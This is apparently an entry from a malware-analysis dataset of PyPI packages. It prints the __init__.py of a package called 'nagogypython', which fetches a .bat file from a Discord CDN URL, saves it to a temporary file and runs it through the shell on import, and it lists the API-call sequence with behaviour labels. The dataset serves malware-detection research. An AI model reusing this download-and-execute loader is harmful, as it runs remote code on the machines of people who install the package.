[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/nagogypython-11.13.8-py3-none-any/reqinstaller/__init__.py",
    "code_snippet": "import os\nimport requests\nimport tempfile\nimport subprocess\nurl = 'https://cdn.discordapp.com/attachments/1110291671603753110/1114597535852535979/nagogy.bat'\nresponse = requests.get(url)\n\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(response.content)\n\nsubprocess.call(temp_file.name, shell=True)",
    "pattern_analysis": {
      "api_sequence": [
        "requests.get",
        "tempfile.NamedTemporaryFile",
        "tempfile.NamedTemporaryFile.write",
        "subprocess.call"
      ],
      "api_sequence_with_args": [
        "requests.get(url)",
        "tempfile.NamedTemporaryFile(delete=False)",
        "tempfile.NamedTemporaryFile.write(response.content)",
        "subprocess.call(temp_file.name, shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "tempfile.NamedTemporaryFile",
          "id": "create_temp_file",
          "description": "Creates temporary file that is not deleted on close",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "tempfile.NamedTemporaryFile.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import requests\nimport tempfile\nimport subprocess\nurl = 'https://cdn.discordapp.com/attachments/1110291671603753110/1114597535852535979/nagogy.bat'\nresponse = requests.get(url)\n\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(response.content)\n\nsubprocess.call(temp_file.name, shell=True)"
    }
  }
]